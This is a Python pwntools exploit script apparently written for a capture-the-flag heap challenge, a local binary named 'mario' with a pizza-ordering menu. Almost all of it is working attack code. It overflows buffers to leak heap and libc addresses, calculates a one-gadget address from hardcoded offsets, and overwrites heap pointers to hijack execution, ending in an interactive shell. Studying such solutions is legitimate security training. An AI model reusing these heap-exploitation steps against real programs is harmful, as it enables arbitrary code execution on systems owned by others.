#! /usr/bin/python

from pwn import *

s = process('./mario')

def print_everything():
    s.recvuntil('Choice: ')
    #print s.recvuntil('Choice: ')	

def new_customer(name):
    s.sendline('N')
    s.sendlineafter('name? ', name)   
    #print 'new_customer res: ', s.recvline()
    print_everything()

def login(name):
    s.sendline('L')
    s.sendlineafter('name? ', name)
    #print 'login res: ', s.recvline()
    print_everything()

def order(num, ingredients):   
    s.sendline("O")
    s.sendlineafter('pizzas? ', str(num))      
    for i in range(num):
        #print "[+] pizza 1, ingredients", ingredients[i]
	s.sendlineafter('ingredients? ', str(len(ingredients[i])))
       
        for j in ingredients[i]:           
            s.sendlineafter(': ', j)

    print_everything()
    

def cook(data):
    s.sendline('C')
    s.sendlineafter('explain: ', data)
    print_everything()

def admire():
    s.sendline('A')
    
def leave():
    s.sendline('L')
    print_everything()
	
def explain(data):
    s.sendline('P')
    s.sendlineafter('explain yourself: ', data)
    print_everything()

def you_are_right():
    s.sendline('Y')
    print_everything()
    
def why_angry():
    s.sendline('W')
    s.recvuntil('this is what he had to say: ')
    res = s.recvline()    
    print_everything()
    return res
        
tomato = '\xf0\x9f\x8d\x85\x00'
chicken = '\xf0\x9f\x90\x94\x00'
banana = '\xf0\x9f\x8d\x8c\x00'
poop = '\xf0\x9f\x92\xa9\x00'
sad_face = '\xf0\x9f\x98\x9e\x00'
pineapple = '\xf0\x9f\x8d\x8d\x00'

print_everything()


# === leak heap ===
new_customer('AAAA')
order(17, [[tomato]] + [['\xf0\x9f\xf0\x9f', '\x8d\x8d\x00']]*16)
cook("a"*260)
leave()

heap_leak = u64(why_angry().strip().ljust(8, '\x00'))
log.info('heap_leak = '+ hex(heap_leak))

# === leak libc ===
new_customer('BBBB')
order(1, [[tomato]])
cook("b"*260)
leave()

libc_leak = u64(why_angry().strip().ljust(8, '\x00'))
# libc_leak = 0x7ffff7839b78
# libc : 0x7ffff7475000
# 0x7ffff7839b78 - 0x7ffff7475000 = 0x3C4B78
libc_addr = libc_leak - 0x3C4B78
log.info('libc_addr = '+ hex(libc_addr))


# === execute oneshot ===
oneshot = libc_addr + 0x4526a   
log.info('oneshot = '+ hex(oneshot))

# heap_leak = 0x5555557740c0
# [heap] : 0x555555773130 ('D' <repeats 160 times>)
# 0x5555557740c0 - 0x555555773130 = 0xF90
oneshot_addr = heap_leak - 0xF90
log.info('oneshot_addr = '+ hex(oneshot_addr))

login('BBBB')
order(1, [[tomato]])
cook("cccc")
leave()

login('AAAA')
explain(p64(oneshot) * 2 + "D" * (160 - 16) + p64(oneshot_addr) * 2)

login('BBBB')
admire()


s.interactive()

'''
gdb.attach(s, """
b * 0x555555557022
""")
'''

































